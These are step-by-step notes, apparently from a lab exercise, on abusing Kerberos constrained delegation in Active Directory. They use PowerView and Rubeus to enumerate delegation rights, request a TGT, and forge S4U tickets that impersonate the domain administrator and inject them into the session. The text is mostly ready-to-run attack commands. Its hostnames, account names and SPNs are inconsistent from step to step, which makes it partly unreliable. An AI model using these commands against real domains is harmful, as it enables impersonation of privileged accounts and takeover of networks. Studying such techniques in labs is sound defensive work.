**IMPORTANT NOTE:** ALL THIS HAVE TO BE PERFORMED FROM A POWERSHELL SESSION

1st Enumeration with PowerView, this will return us that the iisvc account has the msds-allowedtodelegateto property set to: "MSSQLSvc/cdc01.contoso.com:1433"
	
```Get-DomainUser -TrustedToAuth```

2nd Calculate the password hash of the iisvc account
	
```.\Rubeus.exe hash /password:lab```

3rd Ask for a TGT for the iisvc account 
	
```.\Rubeus.exe asktgt /user:iissvc /domain:contoso.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E```
	
4th Request a TGS for the administrator user for accessing the "MSSQLSvc/cdc01.prod.corp1.com:1433" service using the iisvc TGT previously requested
	
 ```.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.contoso.com:1433 /ptt```
	
5th Request a TGS for the administrator user for accessing the "CIFS/cd01.prod.corp1.com:1433" service using the iisvc TGT previously requested
	
 ```.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt```   -> Unfortunately, the SPN for the MSSQL server ends with “:1433”, which is not usable for CIFS since it requires an SPN with the format CIFS/cdc01.prod.corp1.com. If we modify the SPN from CIFS/cdc01.prod.corp1.com:1433 to CIFS/cdc01.prod.corp1.com in the command above, Rubeus generates an KDC_ERR_S_PRINCIPAL_UNKNOWN error, indicating that the modified SPN is not registered.
	
